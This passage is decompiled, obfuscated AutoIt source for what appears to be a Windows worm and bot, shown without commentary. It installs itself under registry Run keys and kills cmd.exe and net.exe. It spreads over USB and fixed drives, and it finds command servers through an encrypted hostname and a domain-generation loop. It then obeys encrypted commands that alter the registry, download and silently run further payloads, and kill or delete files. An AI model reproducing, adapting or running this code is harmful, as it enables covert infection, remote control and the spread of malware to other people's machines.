		EndIf
	EndIf
	Exit
EndIf
If @ScriptDir = @SystemDir And @ScriptFullPath = @SystemDir & "\" & $Var028C Then
	ProcessClose(BinaryToString("0x54656154696D65722E657865"))
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D, "REG_SZ", @SystemDir & "\" & $Var028C)
	If ProcessExists($Var0292) Then
		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
			If RegRead($Var029A, "exp1") <> "" Then
				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
				Fn00A3()
			EndIf
		EndIf
	EndIf
	If ProcessExists($Var0292) Then
		ProcessClose($Var0292)
		Sleep(0x01F4)
		If ProcessExists($Var0292) Then
			ProcessWaitClose($Var0292, 0x003C)
		EndIf
	EndIf
	If ProcessExists("cmd.exe") Then
		ProcessClose("cmd.exe")
		Sleep(0x01F4)
		If ProcessExists("cmd.exe") Then
			ProcessWaitClose("cmd.exe", 0x003C)
		EndIf
	EndIf
	If ProcessExists("net.exe") Then
		ProcessClose("net.exe")
		Sleep(0x01F4)
		If ProcessExists("net.exe") Then
			ProcessWaitClose("net.exe", 0x003C)
		EndIf
	EndIf
	Fn00A4()
	Fn00A2()
	$Var02A7 = $Var028C
	Fn00A9()
	Sleep(10 * 0x03E8)
	Sleep(10 * 0x003C * 0x03E8)
	If ProcessExists($Var0292) Then
		If FileGetVersion(@SystemDir & "\" & $Var028C) <= FileGetVersion(@SystemDir & "\" & $Var0292) Then
			If RegRead($Var029A, "exp1") <> "" Then
				ProcessClose(BinaryToString("0x54656154696D65722E657865"))
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", $Var028D)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $Var028D)
				RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $Var028D)
				Fn00A3()
			EndIf
		EndIf
	EndIf
	Exit
EndIf
If @ScriptDir = @SystemDir Then
EndIf
If @ScriptDir = @SystemDir Then
	If Fn008F("df8g1sdf68g18er1g8re16", 1) = 0 Then
		Exit
	EndIf
	Fn00EB()
	$Var033F = $Var0297 & "!" & $Var02A7
	$Var033F = Fn00A8(1, $Var033F, $Var032F, 1)
	$Var02A8 = $Var02A7
EndIf
If @ScriptDir = "D:\" Or @ScriptDir = "C:\" Or @ScriptDir = "E:\" Or @ScriptDir = "F:\" Or @ScriptDir = "G:\" Or @ScriptDir = "H:\" Or @ScriptDir = "I:\" Or @ScriptDir = "J:\" Or @ScriptDir = "K:\" Or @ScriptDir = "L:\" Or @ScriptDir = "M:\" Or @ScriptDir = "N:\" Or @ScriptDir = "O:\" Or @ScriptDir = "P:\" Or @ScriptDir = "Q:\" Or @ScriptDir = "R:\" Or @ScriptDir = "S:\" Or @ScriptDir = "T:\" Or @ScriptDir = "U:\" Or @ScriptDir = "V:\" Or @ScriptDir = "W:\" Or @ScriptDir = "X:\" Or @ScriptDir = "Y:\" Or @ScriptDir = "Z:\" Then
	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
	$Var0341 = FileGetVersion(@AutoItExe)
	If ProcessExists($Var0292) Then
		If $Var0341 > $Var0340 Then
			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
			$Var02A7 = StringMid(@AutoItExe, $Var0342)
			Fn00A9()
			Sleep(0x03E8)
		EndIf
	Else
		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
		$Var02A7 = StringMid(@AutoItExe, $Var0342)
		Fn00A9()
		Sleep(0x03E8)
	EndIf
	If DriveGetType(@ScriptDir) = "FIXED" Then
		Fn00A4()
		Fn00A3()
		Exit
	EndIf
ElseIf @ScriptDir = @SystemDir Then
	Sleep(2 * 0x003C * 0x03E8)
	If @ScriptFullPath = (@SystemDir & "\" & $Var0292) Or @ScriptFullPath = (@SystemDir & "\" & $Var0298) Then
	Else
		Fn00A3()
	EndIf
	If FileExists(@ScriptDir & "\" & $Var0295) And FileExists(@ScriptDir & "\" & $Var0294) Then
		$Var0343 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
		$Var0344 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
		If $Var0343 <> $Var0344 Then
			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
			Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
		EndIf
	Else
		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
	EndIf
	If FileExists(@ScriptDir & "\" & $Var0295) Then
		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0295, 9)
		$Var0345 = StringTrimLeft($Var0345, 1)
		$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
		$Var0345 = StringSplit($Var0345, "!")
		For $Var0346 = 1 To $Var0345[0]
			If $Var0345[0] = 2 Then
				If $Var0345[1] = $Var0297 Then
					$Var02A8 = $Var0345[2]
					$Var02A7 = $Var0345[2]
				Else
					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
				EndIf
			Else
				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
			EndIf
		Next
	Else
		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F)
	EndIf
	If FileExists(@ScriptDir & "\" & $Var0294) Then
		$Var0345 = FileReadLine(@ScriptDir & "\" & $Var0294, 9)
		$Var0345 = StringTrimLeft($Var0345, 1)
		$Var0345 = Fn00A8(0, $Var0345, $Var032F, 1)
		$Var0345 = StringSplit($Var0345, "!")
		For $Var0346 = 1 To $Var0345[0]
			If $Var0345[0] = 2 Then
				If $Var0345[1] = $Var0297 Then
					$Var02A8 = $Var0345[2]
					$Var02A7 = $Var0345[2]
				Else
					Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
				EndIf
			Else
				Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
			EndIf
		Next
	Else
		Fn00BB(@ScriptDir, $Var02A7, $Var0297, $Var032F, "rem", $Var02A3)
	EndIf
Else
	$Var0340 = FileGetVersion(@SystemDir & "\" & $Var0292)
	$Var0341 = FileGetVersion(@AutoItExe)
	If ProcessExists($Var0292) Then
		If $Var0341 > $Var0340 Then
			$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
			$Var02A7 = StringMid(@AutoItExe, $Var0342)
			Fn00A9()
			Sleep(0x03E8)
		EndIf
	Else
		$Var0342 = StringInStr(@AutoItExe, "\", "", -1) + 1
		$Var02A7 = StringMid(@AutoItExe, $Var0342)
		Fn00A9()
		Sleep(0x03E8)
	EndIf
	Exit
EndIf
If @ScriptDir = @SystemDir Then
	If RegRead($Var029A, "a") = "1" Then
		$Var02D1 = 1
	EndIf
	If RegRead($Var029A, "b") = "1" Then
		$Var02D2 = 1
	EndIf
	If RegRead($Var029A, "a") = "0" Then
		$Var02D1 = 0
	EndIf
	If RegRead($Var029A, "b") = "0" Then
		$Var02D2 = 0
	EndIf
	If RegRead($Var029A, "eggol") = "1" Then
		$Var02C5 = 1
	EndIf
	If RegRead($Var029A, "eggol") = "0" Then
		$Var02C5 = 0
	EndIf
	If RegRead($Var029A, "exp1") <> "" Then
	Else
		RegWrite($Var029A, "exp1", "REG_SZ", Fn00A8(1, @YDAY * 1, $Var032F, 4))
		RegWrite($Var029A, "dreg", "REG_SZ", Fn00A8(1, @YEAR * 1, $Var032F, 4))
		RegWrite($Var029A, "fir", "REG_SZ", "x")
	EndIf
	$Var0347 = "http://www.whatismyip.com/automation/n09230945.asp"
	$Var0348 = $Var0347
	$Var0349 = $Var0347
	$Var034A = Fn00B1()
	If $Var034A = @IPAddress1 Then
		$Var02B9 = 1
	EndIf
	$Var034B = StringSplit($Var034A, ".")
	If $Var034B[0] = 4 Then
		$Var02B1 = $Var034B[1]
		$Var02B2 = $Var034B[2]
		$Var02B3 = $Var034B[3]
		$Var02B4 = 0
	Else
		$Var02B1 = 0x007F
		$Var02B2 = 0
		$Var02B3 = 0
		$Var02B4 = 1
	EndIf
	$Var034C = @IPAddress1
	If $Var034C = "127.0.0.1" Then
		$Var034C = @IPAddress1
		$Var034D = StringSplit($Var034C, ".")
		If $Var034D[0] = 4 Then
			$Var02B5 = $Var034D[1]
			$Var02B6 = $Var034D[2]
			$Var02B7 = $Var034D[3]
			$Var02B8 = 0
		EndIf
	Else
		$Var034D = StringSplit($Var034C, ".")
		If $Var034D[0] = 4 Then
			$Var02B5 = $Var034D[1]
			$Var02B6 = $Var034D[2]
			$Var02B7 = $Var034D[3]
			$Var02B8 = 0
		EndIf
	EndIf
	Fn00B4()
	Fn00A0()
	Fn009C()
	If $Var02D7 = 1 And RegRead($Var029A, "rem1") = "1" Then
		$Var02CA = "usbspread"
		$Var02C8 = "Usb2System"
		$Var02CB = RegRead($Var029A, "rem")
		$Var034E = $Var0337
		$Var02CC = "none"
		Fn00A6()
		RegDelete($Var029A, "rem1")
	EndIf
	If $Var02D7 = 1 And RegRead($Var029A, "fix1") = "1" Then
		$Var02CA = "IPspreader"
		$Var02C8 = "Drive2System"
		$Var02CB = RegRead($Var029A, "fix")
		$Var034E = $Var0338
		$Var02CC = "none"
		Fn00A6()
		RegDelete($Var029A, "fix1")
	EndIf
	$Var034F = DriveGetDrive("FIXED")
	If Not @error Then
		For $Var0350 = 1 To $Var034F[0]
			If DriveStatus($Var034F[$Var0350]) = "READY" Then
				FileWrite($Var034F[$Var0350] & "\" & $Var0297, "")
				FileSetAttrib($Var034F[$Var0350] & "\" & $Var0297, "+RASH")
			EndIf
		Next
	EndIf
	If RegRead($Var029A, "regexp") = Cos(@YDAY * 1) Then
	Else
		RegWrite($Var029A, "regexp", "REG_SZ", Cos(@YDAY * 1))
		$Var034E = $Var0330
		$Var02CA = @OSVersion
		$Var02C8 = "Online"
		$Var02CB = "none"
		$Var02CC = "none"
		Fn00A6()
	EndIf
EndIf
Fn00B4()
If @ScriptDir = @SystemDir Then
	$Var0351 = @HOUR * 1
	$Var0352 = @HOUR * 1
	$Var0353 = @HOUR * 1
	$Var0354 = @MIN * 1
	$Var0355 = @HOUR * 1
	$Var0356 = @HOUR * 1
	$Var0357 = 0
	$Var02AE = TimerInit()
	$Var0358 = TimerInit()
	$Var0359 = TimerInit()
	$Var035A = Random(6, 8, 1)
	$Var035B = 0
	While 1
		Sleep(10)
		If $Var02D7 = 0 Then
			If $Var0353 <> @HOUR * 1 Then
				$Var0353 = @HOUR * 1
				$Var035B = 0
				Fn009C()
				Fn00A0()
			EndIf
		EndIf
		If $Var02D1 = 1 Then
			Sleep(10)
		EndIf
		If $Var02D2 = 1 Then
			Sleep(0x03E8)
		EndIf
		Sleep(5)
		If $Var02D1 = 0 Then
			If $Var02D0 = 1 Then
				If $Var0352 <> @HOUR * 1 Then
					$Var02D0 = 0
				EndIf
			EndIf
			If $Var02D0 = 0 Then
				$Var035C = Round(TimerDiff($Var0358), 0) / 0x03E8
				If $Var035C > 10 Then
					$Var035C = 0
					$Var0358 = 0
					$Var0358 = TimerInit()
					Fn009E()
				EndIf
			EndIf
		EndIf
		If @HOUR * 1 <> $Var0355 And @MIN * 1 = $Var0354 Then
			$Var0355 = @HOUR * 1
			$Var035B = $Var035B + 1
			If $Var035B = $Var035A Then
				$Var035B = 0
				$Var035A = Random(10, 0x0014, 1)
				Fn009C()
				Fn00A0()
			EndIf
		EndIf
		Sleep(5)
		If $Var02CF = 1 Then
			If $Var0351 <> @HOUR * 1 Then
				$Var0351 = @HOUR * 1
				$Var035D = 0x0190
				$Var02CF = 0
			EndIf
		Else
			If @IPAddress1 = "127.0.0.1" Then
			Else
				If $Var02D2 = 0 Then
					If $Var02B1 = 0x007F And $Var02B2 = 0 And $Var02B3 = 0 And $Var02B4 = 1 Then
						Sleep(0x0064)
					Else
						Fn00AB()
					EndIf
					If $Var02D8 = 1 Then
						Fn00AD()
					EndIf
					If $Var02D8 = 2 Then
						Fn00AD()
						If $Var02B8 = 0x00FF Then
							$Var02B8 = 0
							$Var02D8 = 0
						EndIf
					EndIf
				EndIf
			EndIf
		EndIf
		$Var02AF = Round(TimerDiff($Var02AE), 0) / 0x03E8
		If $Var02AF > 0x0258 Then
			$Var02AF = 0
			$Var02AE = 0
			$Var02AE = TimerInit()
			Fn00B4()
		EndIf
		$Var035E = Round(TimerDiff($Var0359), 0) / 0x03E8
		If $Var035E > 0x003C Then
			$Var035E = 0
			$Var0359 = 0
			$Var0359 = TimerInit()
			Fn009F()
		EndIf
	WEnd
EndIf

Func Fn009C()
	Fn00B4()
	Sleep(0x0064)
	$Var035F = Fn00B9($Var0334, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
	$Var029F = Fn009B($Var035F)
	Fn00B6()
	If $Var02DD = 0 Then
		Sleep(0x3A98)
		$Var029F = Fn009B($Var0334)
		Fn00B6()
		If $Var02DD = 0 Then
		EndIf
	EndIf
	If $Var029F <> "" Then
		$Var02D7 = 1
	Else
		$Var02D7 = 0
	EndIf
	If $Var02DD = 1 Then
	EndIf
	If $Var02DD = 0 Then
		Fn00B8()
		Sleep(0x3A98)
		$Var035F = Fn00B9($Var0335, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
		$Var029F = Fn009B($Var035F)
		Fn00B6()
		If $Var02DD = 0 Then
			Sleep(0x3A98)
			$Var029F = Fn009B($Var0335)
			Fn00B6()
			If $Var02DD = 0 Then
			EndIf
		EndIf
		If $Var029F <> "" Then
			$Var02D7 = 1
		Else
			$Var02D7 = 0
		EndIf
	EndIf
	If $Var02DD = 0 Then
		Fn00B8()
		Fn00ED()
		$Var035F = Fn00B9($Var033D, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
		$Var029F = Fn009B($Var035F)
		Fn00B6()
		If $Var02DD = 0 Then
			Sleep(0x3A98)
			$Var029F = Fn009B($Var033D)
			Fn00B6()
			If $Var02DD = 0 Then
			EndIf
		EndIf
		If $Var029F <> "" Then
			$Var02D7 = 1
		Else
			$Var02D7 = 0
		EndIf
		If $Var02DD = 0 Then
			Fn00B8()
			$Var035F = Fn00B9($Var033E, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
			$Var029F = Fn009B($Var035F)
			Fn00B6()
			If $Var02DD = 0 Then
				Sleep(0x3A98)
				$Var029F = Fn009B($Var033E)
				Fn00B6()
				If $Var02DD = 0 Then
				EndIf
			EndIf
			If $Var029F <> "" Then
				$Var02D7 = 1
			Else
				$Var02D7 = 0
			EndIf
		EndIf
	EndIf
	If $Var029F <> "" Then
		$Var02D7 = 1
	Else
		$Var02D7 = 0
	EndIf
	If $Var02DD = 0 And RegRead($Var029A, "exp1") <> "" Then
		Fn00B8()
		$Var0360 = RegRead($Var029A, "exp1")
		$Var0361 = RegRead($Var029A, "dreg")
		$Var0362 = Fn00A8(0, $Var0360, $Var032F, 4) + 0x000F
		$Var0363 = Fn00A8(0, $Var0361, $Var032F, 4)
		If $Var0362 * 1 <= @YDAY * 1 Or $Var0363 * 1 < @YEAR * 1 Then
			Fn00EC()
			$Var035F = Fn00B9($Var0339, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
			$Var029F = Fn009B($Var035F)
			Fn00B6()
			If $Var02DD = 0 Then
				Sleep(0x2710)
				$Var029F = Fn009B($Var0339)
				Fn00B6()
				If $Var02DD = 0 Then
					Sleep(0x3A98)
					$Var035F = Fn00B9($Var033A, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
					$Var029F = Fn009B($Var035F)
					Fn00B6()
					If $Var02DD = 0 Then
						Sleep(0x3A98)
						$Var029F = Fn009B($Var033A)
						Fn00B6()
						If $Var02DD = 0 Then
							Sleep(0x4E20)
							$Var035F = Fn00B9($Var033B, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
							$Var029F = Fn009B($Var035F)
							Fn00B6()
							If $Var02DD = 0 Then
								Sleep(0x4E20)
								$Var029F = Fn009B($Var033B)
								Fn00B6()
								If $Var02DD = 0 Then
									Sleep(0x4E20)
									$Var035F = Fn00B9($Var033C, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
									$Var029F = Fn009B($Var035F)
									Fn00B6()
									If $Var02DD = 0 Then
										Sleep(0x4E20)
										$Var029F = Fn009B($Var033C)
										Fn00B6()
									EndIf
								EndIf
							EndIf
						EndIf
					EndIf
				EndIf
			EndIf
			If $Var02DD = 0 Then
				If @IPAddress1 <> "127.0.0.1" And @IPAddress1 <> "0.0.0.0" Then
					TCPStartup()
					$Var0364 = TCPNameToIP(Fn00A8(0, "408006571CB7BBE3DC1D7A5E0C45C5ABF2F90A9CB151D7C4BCBD1004419295F01C9134AD0EB273C35FCFFBF3EC34261C8624D15A1ED50CC986D48DD17A79649F", $Var032F, 2))
					TCPShutdown()
					$Var0365 = 1
					$Var0364 = StringSplit($Var0364, ".")
					If $Var0364[0] = 4 Then
						$Var0365 = $Var0364[1] + $Var0364[2] + $Var0364[3] + $Var0364[3]
					Else
						$Var0365 = 1
					EndIf
					$Var0366 = 0x0061
					$Var0367 = 0x0030
					$Var0368 = 0
					While 1
						$Var0369 = Fn00A8(1, $Var0365, $Var0365, 0)
						$Var036A = Chr($Var0366)
						$Var036B = Chr($Var0367)
						$Var0366 = $Var0366 + 1
						$Var0367 = $Var0367 + 1
						$Var0365 = $Var0365 + 1
						$Var036C = Fn00A8(1, $Var036A & $Var036B, $Var0369, 0)
						$Var036D = StringLower($Var036C)
						If $Var036D = "62d13aa0" Then $Var036D = "5eb149c0"
						If $Var036D = "ffbfcf9b" Then $Var036D = "5eb149c0"
						$Var036E = "http://www." & $Var036D & ".com/" & $Var0369 & ".htm"
						$Var035F = Fn00B9($Var036E, 0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057)
						$Var029F = Fn009B($Var035F)
						Fn00B6()
						If $Var02DD = 0 Then
							$Var029F = Fn009B($Var036E)
							Fn00B6()
						EndIf
						If $Var02DD = 1 Then ExitLoop
						If $Var0366 = 0x007A Then $Var0366 = 0x0061
						If $Var0367 = 0x0039 Then $Var0367 = 0x0030
						If $Var0365 = 0x000F Then ExitLoop
						If $Var0364[0] = 4 Then
							$Var0368 = $Var0368 + 1
							If $Var0368 = 3 Then ExitLoop
						EndIf
					WEnd
				Else
				EndIf
			EndIf
			If $Var029F <> "" Then
				$Var02D7 = 1
			Else
				$Var02D7 = 0
			EndIf
		EndIf
	EndIf
	Fn00B8()
	If $Var02F9 = 1 Then
		$Var036F = StringRegExp($Var029F, "aoksndoknhd6f14e635136d51v6b5n1g61", 0)
		$Var0370 = StringRegExp($Var029F, "9sgh51", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "aoksndoknhd6f14e635136d51v6b5n1g61"
			$Var0372 = "9sgh51"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0373 = StringSplit($Var02C6, " ")
			If $Var0373[0] = 3 Then
				$Var0347 = $Var0373[1]
				$Var0348 = $Var0373[2]
				$Var0349 = $Var0373[3]
				$Var034A = Fn00B1()
				If $Var034A = @IPAddress1 Then
					$Var02B9 = 1
				EndIf
				$Var034B = StringSplit($Var034A, ".")
				If $Var034B[0] = 4 Then
					$Var02B1 = $Var034B[1]
					$Var02B2 = $Var034B[2]
					$Var02B3 = $Var034B[3]
					$Var02B4 = 0
				Else
					$Var02B1 = 0x007F
					$Var02B2 = 0
					$Var02B3 = 0
					$Var02B4 = 1
				EndIf
			EndIf
		EndIf
	Else
		If $Var034A = "-1" Then
			$Var034A = Fn00B1()
		EndIf
	EndIf
	If $Var02EB = 1 Then
		RegDelete($Var029A)
	EndIf
	If $Var02E1 = 1 Then
		$Var036F = StringRegExp($Var029F, "VRXe", 0)
		$Var0370 = StringRegExp($Var029F, "VEgXx1013dx", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "VRXe"
			$Var0372 = "VEgXx1013dx"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0374 = StringSplit($Var02C6, "@")
			For $Var0350 = 1 To $Var0374[0]
				$Var0375 = StringSplit($Var0374[$Var0350], "~")
				If $Var0375[0] >= 2 Then
					If $Var0375[0] = 3 Then
						If $Var0375[1] = "Rem" Then
							RegDelete($Var0375[2], $Var0375[3])
						EndIf
					EndIf
					If $Var0375[0] = 2 Then
						If $Var0375[1] = "Rem" Then
							$Var0376 = RegDelete($Var0375[2])
						EndIf
						If $Var0375[1] = "Add" Then
							RegWrite($Var0375[2])
						EndIf
					EndIf
					If $Var0375[0] = 5 Then
						If $Var0375[1] = "Add" Then
							RegWrite($Var0375[2], $Var0375[3], $Var0375[4], $Var0375[5])
						EndIf
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02EF = 1 Or $Var02ED = 1 Or $Var02FE = 1 Or $Var02FF = 1 Then
		$Var02A0 = "http://geoloc.daiguo.com/?self"
		$Var02A1 = "http://geoloc.daiguo.com/?self"
		If $Var02F8 = 1 Then
			$Var036F = StringRegExp($Var029F, "FHKJA6518GSEJdhjh65hhg4HTaekjb4hn6y1kkkjhj", 0)
			$Var0370 = StringRegExp($Var029F, "FHKJA6518GSEJdkkkjdfekjb4hn6y1kkkjhj", 0)
			If $Var036F = 1 And $Var0370 = 1 Then
				$Var0371 = "FHKJA6518GSEJdhjh65hhg4HTaekjb4hn6y1kkkjhj"
				$Var0372 = "FHKJA6518GSEJdkkkjdfekjb4hn6y1kkkjhj"
				$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
				$Var0373 = StringSplit($Var02C6, " ")
				If $Var0373[0] = 2 Then
					$Var02A0 = $Var0373[1]
					$Var02A1 = $Var0373[2]
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var02F7 = 1 Then
		$Var036F = StringRegExp($Var029F, "j6g54s6545L1H93JL57FG657H1", 0)
		$Var0370 = StringRegExp($Var029F, "Z95X1C3BN57M4HGF659FGH1", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "j6g54s6545L1H93JL57FG657H1"
			$Var0372 = "Z95X1C3BN57M4HGF659FGH1"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0377 = StringSplit($Var02C6, "@")
			For $Var0378 = 1 To $Var0377[0]
				$Var0379 = 0
				$Var037A = StringSplit($Var0377[$Var0378], "%")
				If $Var037A[0] = 2 Then
					$Var037B = $Var037A[1]
					$Var037C = $Var037A[2]
					$Var037B = StringSplit($Var037B, "~")
					If $Var037B[0] >= 3 Then
						If RegRead($Var037B[1], $Var037B[2]) = $Var037B[3] Then
							$Var0379 = 1
						Else
						EndIf
					EndIf
					If $Var0379 = 1 Then
						$Var037D = StringSplit($Var037C, "&")
						For $Var0350 = 1 To $Var037D[0]
							$Var037E = StringSplit($Var037D[$Var0350], "~")
							If $Var037E[0] >= 2 Then
								If $Var037E[0] = 3 Then
									If $Var037E[1] = "Rem" Then
										RegDelete($Var037E[2], $Var037E[3])
									EndIf
								EndIf
								If $Var037E[0] = 2 Then
									If $Var037E[1] = "Rem" Then
										$Var0376 = RegDelete($Var037E[2])
									EndIf
									If $Var037E[1] = "Add" Then
										RegWrite($Var037E[2])
									EndIf
								EndIf
								If $Var037E[0] = 5 Then
									If $Var037E[1] = "Add" Then
										RegWrite($Var037E[2], $Var037E[3], $Var037E[4], $Var037E[5])
									EndIf
								EndIf
							EndIf
						Next
					EndIf
				EndIf
			Next
		EndIf
	EndIf
	If $Var02F1 = 1 Then
		$Var02AA = 0
		$Var036F = StringRegExp($Var029F, "Q9V7U2s4U9m1H5A6T7K5T4c15Wf9D5", 0)
		$Var0370 = StringRegExp($Var029F, "Z9Z9DE4df98h4G6H46df65g4F4444F", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "Q9V7U2s4U9m1H5A6T7K5T4c15Wf9D5"
			$Var0372 = "Z9Z9DE4df98h4G6H46df65g4F4444F"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var037F = StringSplit($Var02C6, "@")
			For $Var0380 = 1 To $Var037F[0]
				$Var0381 = StringSplit($Var037F[$Var0380], " ")
				$Var0382 = 0
				$Var0383 = 0
				$Var0384 = 0
				If $Var0381[0] = 10 Then
					$Var0385 = $Var0381[1]
					$Var0386 = $Var0381[2]
					$Var0387 = $Var0381[3]
					$Var0388 = $Var0381[4]
					$Var0389 = $Var0381[5]
					$Var0384 = $Var0381[6]
					$Var0383 = $Var0381[8]
					$Var038A = $Var0381[9]
					$Var038B = $Var0381[10]
					$Var038C = 0
					$Var038D = Random(1, $Var038B, 1)
					If $Var038D = 1 Or $Var038D = 0 Then
						If FileExists(@SystemDir & "\" & $Var0386) And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
							$Var038C = 1
						Else
							InetGet($Var0385, @SystemDir & "\" & $Var0386, 1, 0)
							If FileExists(@SystemDir & "\" & $Var0386) And FileGetSize(@SystemDir & "\" & $Var0386) = $Var0387 Then
								$Var038C = 1
							Else
								FileSetAttrib(@SystemDir & "\" & $Var0386, "-RASH")
								FileDelete(@SystemDir & "\" & $Var0386)
							EndIf
						EndIf
						If $Var0383 = 1 Then
							Select
								Case StringInStr($Var02A4, $Var038A)
									$Var038C = 0
								Case Not StringInStr($Var02A4, $Var038A)
									$Var02A4 = $Var02A4 & $Var038A
							EndSelect
						EndIf
						If $Var038C = 1 Then
							$Var038E = @SystemDir & "\" & $Var0386
							$Var038F = $Var0386 & ".au3"
							If FileExists($Var038E) Then
								FileDelete($Var038F)
								Fn00B2($Var038E, $Var038F)
								If FileExists($Var038F) Then
									$Var0390 = $Var038F
									RegDelete($Var029A, "output2")
									RegDelete($Var029A, "input2")
									RegWrite($Var029A, "input2", "REG_SZ", $Var0388)
									If @Compiled = 1 Then
										$Var0391 = FileGetShortName(@AutoItExe & " /AutoIt3ExecuteScript """ & $Var0390 & """")
										Run($Var0391)
									Else
										$Var0392 = FileGetShortName($Var0390)
										Run(@AutoItExe & " " & $Var0392, "", @SW_HIDE)
									EndIf
									If $Var0384 = "1" Then
										$Var0393 = 0
										While 1
											Sleep(0x03E8)
											$Var0393 = $Var0393 + 1
											$Var0394 = RegRead($Var029A, "output2")
											If $Var0394 <> "" Then
												RegDelete($Var029A, "output2")
												ExitLoop
											EndIf
											If $Var0393 = $Var0389 Then
												ExitLoop
											EndIf
										WEnd
									EndIf
								EndIf
							Else
							EndIf
						EndIf
					EndIf
				EndIf
				Sleep(0x2710)
			Next
		EndIf
	EndIf
	If $Var02DF = 1 Then
		$Var036F = StringRegExp($Var029F, "Vx01", 0)
		$Var0370 = StringRegExp($Var029F, "Viz91", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "Vx01"
			$Var0372 = "Viz91"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
			$Var0395 = StringSplit($Var02C6, "~")
			For $Var0350 = 1 To $Var0395[0]
				$Var0396 = StringInStr($Var0395[$Var0350], "/", 2, -1) + 1
				$Var0397 = StringMid($Var0395[$Var0350], $Var0396)
				If ProcessExists($Var0397) Then
					If ProcessExists($Var0397) Then
						ProcessClose($Var0397)
						Sleep(0x01F4)
						If ProcessExists($Var0397) Then
							ProcessWaitClose($Var0397, 0x003C)
						EndIf
					EndIf
				EndIf
				If FileExists(@SystemDir & "\" & $Var0395[$Var0350]) Then
					FileSetAttrib(@SystemDir & "\" & $Var0395[$Var0350], "-RASH")
					FileDelete(@SystemDir & "\" & $Var0395[$Var0350])
					Sleep(0x1388)
				EndIf
				If FileExists(@TempDir & "\" & $Var0395[$Var0350]) Then
					FileSetAttrib(@TempDir & "\" & $Var0395[$Var0350], "-RASH")
					FileDelete(@TempDir & "\" & $Var0395[$Var0350])
					Sleep(0x1388)
				EndIf
				If FileExists(@WindowsDir & "\" & $Var0395[$Var0350]) Then
					FileSetAttrib(@WindowsDir & "\" & $Var0395[$Var0350], "-RASH")
					FileDelete(@WindowsDir & "\" & $Var0395[$Var0350])
					Sleep(0x1388)
				EndIf
				If FileExists(@HomeDrive & "\" & $Var0395[$Var0350]) Then
					FileSetAttrib(@WindowsDir & "\" & $Var0395[$Var0350], "-RASH")
					FileDelete(@WindowsDir & "\" & $Var0395[$Var0350])
					Sleep(0x1388)
				EndIf
			Next
		EndIf
	EndIf
	If $Var02EC = 1 Then
		$Var036F = StringRegExp($Var029F, "lJ3unI78hCE988eo87wt8cWET", 0)
		$Var0370 = StringRegExp($Var029F, "A0askdh8WDhoH111o8h8DW345", 0)
		If $Var036F = 1 And $Var0370 = 1 Then
			$Var0371 = "lJ3unI78hCE988eo87wt8cWET"
			$Var0372 = "A0askdh8WDhoH111o8h8DW345"
			$Var02C6 = Fn00A7($Var029F, $Var0371, $Var0372, $Var032F)
